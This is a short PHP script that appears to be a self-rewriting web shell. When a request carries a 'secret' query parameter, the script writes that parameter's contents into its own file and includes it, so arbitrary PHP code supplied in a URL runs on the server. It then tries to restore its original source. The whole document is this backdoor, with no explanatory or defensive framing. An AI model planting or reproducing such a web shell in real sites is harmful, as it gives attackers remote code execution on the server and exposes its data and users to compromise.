<?php


$lines = explode(PHP_EOL, file_get_contents(__FILE__));

$code = join(PHP_EOL, array_slice($lines, 0, 20));

if ($_GET['secret']) {

file_put_contents(__FILE__, $code . PHP_EOL . $_GET['secret'] . PHP_EOL . ';file_put_contents(__FILE__, $code);');

$_GET['secret'] = false;

include __FILE__;

}

//